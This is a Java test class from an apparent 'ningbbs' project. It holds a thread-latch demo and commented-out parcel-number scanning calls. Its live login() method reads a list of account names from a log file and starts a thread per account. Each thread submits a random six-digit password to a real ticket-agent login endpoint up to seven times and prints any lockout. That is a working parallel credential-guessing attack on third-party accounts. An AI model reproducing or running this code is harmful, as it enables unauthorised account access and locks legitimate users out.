package ningbbs.test;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.concurrent.CountDownLatch;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import ningbbs.http.Post;
import ningbbs.kd.SfSearch;
import ningbbs.util.Constants;
import ningbbs.util.FileUtil;

import org.apache.http.Header;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

public class Main {
	public static void main(String[] args) throws Exception {
		if(args.length<1){
			System.out.println("无参数");
			//System.exit(0);
		}
		//606270000122
		//606465478913
		//606474195462
		//606483673103
		//606527194398
		//606586535686
		//606600360000
		//606608589097 
		//606635604875
		/*
		SfService ss=Constants.serviceFactory("606633", 0);
		while(ss.getSend_Index()<=1000020){
			List<SfSearch> list=ss.scan(ss);
			System.out.println(list.size());
			ss.add_kd_DB(list);
		}
		*/
		//AddressUtil.address_To_DB(Constants.serviceFactory("606650", 0));
		//test("606600");
		//System.out.println(AddressUtil.addressHandle("东莞企石下截村营业部", false));
		//login();
		l();
	}
	public static void l(){
		List<Integer> list = new ArrayList<>();
		list.add(1);
		list.add(2);
		list.add(2);
		final CountDownLatch latch=new CountDownLatch(list.size());//两个工人的协作 
		for (int i = 0; i < list.size(); i++) {
			new Thread(new Runnable() {
				public void run() {
					try {
						Thread.sleep(10000);
					} catch (InterruptedException e) {
						e.printStackTrace();
					}
					System.out.println("a");
					latch.countDown();
				}
			}).start();
		}
		try {
			latch.await();//等待全部完成
		} catch (InterruptedException e) {
			e.printStackTrace();
		}
		System.out.println("完成");
	}
	public static void login() throws IOException{
		String txt=FileUtil.readHtml("GsdmIdList.log");
		Pattern p=Pattern.compile("全部 .*? （");
		Matcher m=p.matcher(txt);
		while(m.find()){
			String gsdm=m.group().replace("全部 ", "").replace(" （", "");
			System.out.println("----------"+gsdm);
			String[] gsdms=gsdm.split(" ");
			for(int i=0;i<gsdms.length;i++){
				new Thread(new LoginThread(gsdms[i])).start();
			}
		}
	}

	public static String vail(String userName,String pwd) throws Exception{
		List<NameValuePair> nvps = new ArrayList<NameValuePair>();
		nvps.add(new BasicNameValuePair("loginName", userName));
		nvps.add(new BasicNameValuePair("password", pwd));
		Post post=new Post("http://www.tiexiaoer.com/TicketAgent/LoginV2/VailMsg", "", nvps);
		Header[]  hs=post.getRequestHeader();
		if(hs!=null){
			for(int i=0;i<hs.length;i++){
				Header h=hs[i];
				System.out.println(h.getName()+" "+h.getValue());
			}
		}
		return post.getHtml(null, "GBK");
	}
}
class LoginThread implements Runnable{
	public String userName;
	public LoginThread(String userName){
		this.userName=userName;
	}
	public void run() {
		String code= String.format("%0"+6+"d", new Random().nextInt(999999));
		for(int j=0;j<7;j++){
			try {
				String html=Main.vail(userName,code);
				if(html.endsWith("SuccessiveFail")){
					System.out.println(userName+"被锁定");
					break;
				}
				System.out.println(userName+"	"+html);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}
}
